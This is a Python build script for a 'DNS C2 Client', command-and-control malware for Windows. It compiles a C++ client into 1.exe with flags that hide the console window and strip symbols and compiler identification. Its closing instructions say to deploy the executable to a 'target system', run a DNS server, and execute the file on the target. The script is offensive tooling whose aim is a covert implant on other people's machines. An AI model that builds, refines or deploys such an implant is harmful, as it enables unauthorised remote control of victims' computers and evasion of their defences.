#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS C2 Client Builder
Compiles the C++ client for Windows
"""

import os
import sys
import subprocess
import platform
import re
from datetime import datetime

# Fix Windows console encoding issues
if sys.platform == 'win32':
    try:
        # Try to set UTF-8 encoding for Windows console
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'ignore')
        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'ignore')
    except:
        pass

# Build configuration
SOURCE_FILE = "client.cp.cpp"
OUTPUT_FILE = "1.exe"
COMPILER = "g++"
COMPILE_FLAGS = [
    "-o", OUTPUT_FILE,
    "-lws2_32",
    "-lshell32",
    "-std=c++11",
    "-static-libgcc",
    "-static-libstdc++",
    "-mwindows"  # Build as Windows GUI app (no console)
]

# Optional optimization flags
OPTIMIZATION_FLAGS = [
    "-O2",           # Optimize for speed
    "-s",            # Strip symbols (reduce size)
    "-fno-asynchronous-unwind-tables",  # Reduce binary size
    "-fno-ident",    # Remove compiler identification
    "-fomit-frame-pointer",  # Optimize stack frames
]

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Print build script banner"""
    banner = f"""
{Colors.OKCYAN}╔═══════════════════════════════════════════════════════════╗
║           DNS C2 Client Builder                           ║
║           Building Windows Client (C++)                   ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}
    """
    print(banner)

def fix_mingw_path():
    """Fix MinGW PATH issues by adding libexec directory"""
    try:
        # Get the cc1plus path that g++ expects
        result = subprocess.run([COMPILER, "--print-prog-name=cc1plus"],
                              capture_output=True,
                              text=True,
                              timeout=5)
        if result.returncode == 0:
            cc1plus_path = result.stdout.strip()
            # Extract the directory
            match = re.search(r'(.+)[/\\]cc1plus\.exe', cc1plus_path, re.IGNORECASE)
            if match:
                libexec_dir = match.group(1).replace('/', '\\')
                # Add to PATH if not already there
                if libexec_dir not in os.environ['PATH']:
                    os.environ['PATH'] = libexec_dir + os.pathsep + os.environ['PATH']
                    print(f"{Colors.OKGREEN}[+] Added to PATH: {libexec_dir}{Colors.ENDC}")
                    return True
    except Exception as e:
        print(f"{Colors.WARNING}[!] Could not auto-fix PATH: {e}{Colors.ENDC}")
    return False

def check_prerequisites():
    """Check if required tools are available"""
    print(f"{Colors.OKBLUE}[*] Checking prerequisites...{Colors.ENDC}")
    
    # Check if g++ is available
    try:
        result = subprocess.run([COMPILER, "--version"], 
                              capture_output=True, 
                              text=True, 
                              timeout=5)
        if result.returncode == 0:
            version = result.stdout.split('\n')[0]
            print(f"{Colors.OKGREEN}[+] {version}{Colors.ENDC}")
            
            # Try to fix MinGW PATH issues
            fix_mingw_path()
        else:
            print(f"{Colors.FAIL}[-] g++ not found or not working{Colors.ENDC}")
            return False
    except FileNotFoundError:
        print(f"{Colors.FAIL}[-] g++ not found in PATH{Colors.ENDC}")
        print(f"{Colors.WARNING}    Install MinGW-w64 or TDM-GCC{Colors.ENDC}")
        return False
    except Exception as e:
        print(f"{Colors.FAIL}[-] Error checking g++: {e}{Colors.ENDC}")
        return False
    
    # Check if source file exists
    if not os.path.exists(SOURCE_FILE):
        print(f"{Colors.FAIL}[-] Source file '{SOURCE_FILE}' not found{Colors.ENDC}")
        return False
    else:
        size = os.path.getsize(SOURCE_FILE)
        print(f"{Colors.OKGREEN}[+] Source file found ({size} bytes){Colors.ENDC}")
    
    return True

def clean_build():
    """Remove old build artifacts"""
    print(f"\n{Colors.OKBLUE}[*] Cleaning old build...{Colors.ENDC}")
    
    if os.path.exists(OUTPUT_FILE):
        try:
            os.remove(OUTPUT_FILE)
            print(f"{Colors.OKGREEN}[+] Removed old {OUTPUT_FILE}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.WARNING}[!] Could not remove {OUTPUT_FILE}: {e}{Colors.ENDC}")
    else:
        print(f"{Colors.OKGREEN}[+] No old builds to clean{Colors.ENDC}")

def compile_client(optimize=False):
    """Compile the C++ client"""
    print(f"\n{Colors.OKBLUE}[*] Compiling {SOURCE_FILE}...{Colors.ENDC}")
    
    # Build command
    compile_command = [COMPILER, SOURCE_FILE] + COMPILE_FLAGS
    
    if optimize:
        compile_command += OPTIMIZATION_FLAGS
        print(f"{Colors.OKCYAN}[*] Optimization enabled{Colors.ENDC}")
    
    # Print command
    cmd_str = ' '.join(compile_command)
    print(f"{Colors.OKCYAN}[*] Command: {cmd_str}{Colors.ENDC}\n")
    
    # Execute compilation
    start_time = datetime.now()
    
    try:
        result = subprocess.run(
            compile_command,
            capture_output=True,
            text=True,
            timeout=120  # 2 minute timeout
        )
        
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        # Check result
        if result.returncode == 0:
            # Success
            if os.path.exists(OUTPUT_FILE):
                size = os.path.getsize(OUTPUT_FILE)
                size_kb = size / 1024
                print(f"{Colors.OKGREEN}{'='*60}{Colors.ENDC}")
                print(f"{Colors.OKGREEN}[+] Compilation successful!{Colors.ENDC}")
                print(f"{Colors.OKGREEN}[+] Output: {OUTPUT_FILE} ({size_kb:.1f} KB){Colors.ENDC}")
                print(f"{Colors.OKGREEN}[+] Build time: {duration:.2f} seconds{Colors.ENDC}")
                print(f"{Colors.OKGREEN}{'='*60}{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.FAIL}[-] Compilation reported success but {OUTPUT_FILE} not found{Colors.ENDC}")
                return False
        else:
            # Compilation failed
            print(f"{Colors.FAIL}{'='*60}{Colors.ENDC}")
            print(f"{Colors.FAIL}[-] Compilation failed!{Colors.ENDC}")
            print(f"{Colors.FAIL}{'='*60}{Colors.ENDC}")
            
            if result.stderr:
                print(f"\n{Colors.FAIL}Error output:{Colors.ENDC}")
                print(result.stderr)
            
            if result.stdout:
                print(f"\n{Colors.WARNING}Standard output:{Colors.ENDC}")
                print(result.stdout)
            
            return False
    
    except subprocess.TimeoutExpired:
        print(f"{Colors.FAIL}[-] Compilation timed out (>120s){Colors.ENDC}")
        return False
    except Exception as e:
        print(f"{Colors.FAIL}[-] Compilation error: {e}{Colors.ENDC}")
        return False

def show_usage():
    """Show usage instructions"""
    print(f"\n{Colors.OKCYAN}Usage Instructions:{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}python build.py{Colors.ENDC}          - Standard build")
    print(f"  {Colors.OKGREEN}python build.py optimize{Colors.ENDC} - Optimized build (smaller, faster)")
    print(f"  {Colors.OKGREEN}python build.py clean{Colors.ENDC}    - Clean build artifacts only")
    print()

def main():
    """Main build function"""
    print_banner()
    
    # Parse arguments
    optimize = False
    clean_only = False
    
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        if arg in ['optimize', 'optimized', '-o', '--optimize']:
            optimize = True
        elif arg in ['clean', '--clean', '-c']:
            clean_only = True
        elif arg in ['help', '--help', '-h']:
            show_usage()
            return
        else:
            print(f"{Colors.WARNING}[!] Unknown argument: {arg}{Colors.ENDC}")
            show_usage()
            return
    
    # Check prerequisites
    if not check_prerequisites():
        print(f"\n{Colors.FAIL}[-] Prerequisites check failed{Colors.ENDC}")
        sys.exit(1)
    
    # Clean old builds
    clean_build()
    
    if clean_only:
        print(f"\n{Colors.OKGREEN}[+] Clean completed{Colors.ENDC}")
        return
    
    # Compile
    success = compile_client(optimize=optimize)
    
    if success:
        print(f"\n{Colors.OKGREEN}[+] Build completed successfully!{Colors.ENDC}")
        print(f"\n{Colors.OKCYAN}Next steps:{Colors.ENDC}")
        print(f"  1. Configure your DNS server IP in the source if needed")
        print(f"  2. Deploy {OUTPUT_FILE} to target system")
        print(f"  3. Start server.py on your DNS server (port 53, requires admin)")
        print(f"  4. Execute {OUTPUT_FILE} on target")
        print()
        sys.exit(0)
    else:
        print(f"\n{Colors.FAIL}[-] Build failed{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Check the error messages above{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Build interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.FAIL}[X] Unexpected error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

